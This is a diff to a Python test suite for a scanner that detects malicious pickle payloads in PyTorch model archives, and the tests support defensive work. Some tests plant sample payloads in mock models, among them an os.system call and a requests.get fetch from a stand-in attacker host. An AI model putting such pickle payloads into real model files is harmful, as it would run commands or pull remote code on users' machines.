@@ -8030,6 +8030,7 @@ def test_pytorch_zip_allows_inert_pickle_url_literals_without_critical_s310(tmp_
         {
             "license": "https://ultralytics.com/license",
             "docs": "https://docs.ultralytics.com/reference/os.system(command)",
+            "api_docs": "https://docs.example.invalid/reference/requests.get(url)",
             "repository": "https://github.com/ultralytics/ultralytics",
         },
         protocol=0,
@@ -8041,6 +8042,21 @@ def test_pytorch_zip_allows_inert_pickle_url_literals_without_critical_s310(tmp_
 
     assert result.success is True
     assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_pytorch_zip_keeps_code_after_url_literal_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "url-then-code.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"loader": "u='https://example.invalid/p';os.system('id')"}, protocol=0)
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and (issue.details.get("associated_global") == "os.system" or "os.system" in issue.message)
+        for issue in result.issues
+    )
 
 
 def test_pytorch_zip_keeps_executable_network_pickle_literal_actionable(tmp_path: Path) -> None:
@@ -8058,11 +8074,23 @@ def test_pytorch_zip_keeps_executable_network_pickle_literal_actionable(tmp_path
     result = PyTorchZipScanner().scan(str(model_path))
 
     assert any(
-        issue.severity == IssueSeverity.CRITICAL
-        and issue.details.get("type") == "network_function"
-        and issue.details.get("function") == "requests.get"
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
         for issue in result.issues
     )
+
+
+def test_pytorch_zip_keeps_spaced_network_attribute_url_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "spaced-network-code.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"loader": "requests . get('https://attacker.example/payload')"}, protocol=0)
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
     assert any(
         issue.rule_code == "S310"
         and issue.severity == IssueSeverity.CRITICAL
